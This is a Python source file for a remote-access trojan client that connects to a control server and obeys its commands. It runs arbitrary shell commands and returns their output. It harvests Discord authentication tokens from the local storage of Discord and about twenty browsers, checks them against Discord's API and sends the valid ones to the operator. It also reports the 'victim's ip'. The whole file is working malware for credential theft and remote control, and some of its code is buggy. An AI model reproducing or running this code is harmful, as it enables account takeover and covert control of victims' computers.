import socket
import threading
import pickle
import os
import requests
import subprocess
from time import sleep
import re
import sys

state = {}
pcname = socket.gethostname()
connected = False

def shell(serverSocket, command: str):

    def shell():
        output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        return output

    shel = threading.Thread(target=shell)
    shel._running = True
    shel.start()
    sleep(1)
    shel._running = False

    result = str(shell().stdout.decode('CP437'))
    numb = len(result)

    if result != "":
        if numb < 1:
            serverSocket.send(b"/messageSend")
            serverSocket.send(bytes("unrecognized command or no output was obtained", "utf-8"))

        elif numb > 1990:
            f1 = open("output.txt", 'a')
            f1.write(result)
            f1.close()

            f1 = open("output.txt", 'a')
            for line in f1:
                file = file + line
                print(line)

            serverSocket.send(b"/messageSend")
            serverSocket.send(bytes("Command successfully executed" + file, "utf-8"))

            os.remove("output.txt")
        else:
            serverSocket.send(b"/messageSend")
            serverSocket.send(bytes(f"Command successfully executed:\\n```\\n{result}```", "utf-8"))
    else:
        serverSocket.send(b"/messageSend")
        serverSocket.send(bytes("unrecognized command or no output was obtained", "utf-8"))

def getToken(serverSocket):

    serverSocket.send(b"/messageSend")
    serverSocket.send(bytes("Extracting tokens...", "utf-8"))
    tokens = []
    saved = ""
    paths = {
        'Discord': os.getenv('APPDATA') + r'\\\\discord\\\\Local Storage\\\\leveldb\\\\',
        'Discord Canary': os.getenv('APPDATA') + r'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',
        'Lightcord': os.getenv('APPDATA') + r'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',
        'Discord PTB': os.getenv('APPDATA') + r'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',
        'Opera': os.getenv('APPDATA') + r'\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',
        'Opera GX': os.getenv('APPDATA') + r'\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',
        'Amigo': os.getenv('LOCALAPPDATA') + r'\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Torch': os.getenv('LOCALAPPDATA') + r'\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Kometa': os.getenv('LOCALAPPDATA') + r'\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Orbitum': os.getenv('LOCALAPPDATA') + r'\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'CentBrowser': os.getenv('LOCALAPPDATA') + r'\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        '7Star': os.getenv('LOCALAPPDATA') + r'\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Sputnik': os.getenv('LOCALAPPDATA') + r'\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Vivaldi': os.getenv('LOCALAPPDATA') + r'\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Chrome': os.getenv('LOCALAPPDATA') + r'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',
        'Uran': os.getenv('LOCALAPPDATA') + r'\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Yandex': os.getenv('LOCALAPPDATA') + r'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Brave': os.getenv('LOCALAPPDATA') + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Iridium': os.getenv('LOCALAPPDATA') + r'\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'
    }
    for source, path in paths.items():
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in re.findall(regex, line):
                        tokens.append(token)
    for token in tokens:
        r = requests.get("https://discord.com/api/v9/users/@me", headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
            "Authorization": token
        })
        if r.status_code == 200:
            if token in saved:
                continue
            saved += f"`{token}`\\n\\n"
    if saved != "":
        serverSocket.send(b"/messageSend")
        serverSocket.send(bytes("Token(s) succesfully grabbed: \\n{saved}", "utf-8"))
    else:
        serverSocket.send(b"/messageSend")
        serverSocket.send(bytes("User didn't have any stored tokens", "utf-8"))
def serverListen(serverSocket):
    while True:
        try:
            msg = serverSocket.recv(1024).decode("utf-8")
            if msg == "getIP":
                url = 'http://myexternalip.com/raw'
                r = requests.get(url)
                ip = r.text
                serverSocket.send(b"/messageSend")
                serverSocket.send(bytes("victim's ip: " + ip, "utf-8"))

            elif "shell" in msg:
                command = msg.replace("shell", "")
                print(command)
                shell(serverSocket, command)

            elif msg == "blockinput":

                serverSocket.send(b"/messageSend")
                serverSocket.send(bytes("Succesfully blocked!", "utf-8"))

            elif msg == "unblockinput":

                serverSocket.send(b"/messageSend")
                serverSocket.send(bytes("Succesfully unblocked!", "utf-8"))

            elif msg == "getToken":

                getToken(serverSocket)
            else:
                print(msg)
        except:
            print("connection lost")
            main()
            break
def main():
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    def connect():
        try:
            serverSocket.connect(("localhost", 8000))
        except:
            print("connection error trying again in 10 seconds")
            sleep(10)
            connect()
    connect()
    print("Available sessions: ")
    print(serverSocket.recv(1024).decode("utf-8"))
    state["inputCondition"] = threading.Condition()
    state["sendMessageLock"] = threading.Lock()
    state["username"] = pcname
    state["groupname"] = pcname + "' " + "session"
    state["alive"] = False
    state["joinDisconnect"] = False
    state["inputMessage"] = True
    serverSocket.send(bytes(state["username"], "utf-8"))
    serverSocket.recv(1024)
    serverSocket.send(bytes(state["groupname"], "utf-8"))
    response = serverSocket.recv(1024).decode("utf-8")
    if response == "/adminReady":
        print("You have created the group", state["groupname"], "and are now an admin.")
        state["alive"] = True
    elif response == "/ready":
        print("You have joined the group", state["groupname"])
        state["alive"] = True

    serverListenThread = threading.Thread(target=serverListen, args=(serverSocket,))

    while True:
        if state["alive"] or state["joinDisconnect"]:
            break
    if state["alive"]:



        serverListenThread.start()



    while True:
        if state["joinDisconnect"]:
            serverSocket.shutdown(socket.SHUT_RDWR)
            serverSocket.close()


            print("Disconnected from session.")
            break
        elif not state["alive"]:
            serverSocket.shutdown(socket.SHUT_RDWR)
            serverSocket.close()

            serverListenThread.join()
            print("Disconnected from session.")
            break


if __name__ == "__main__":
    main()
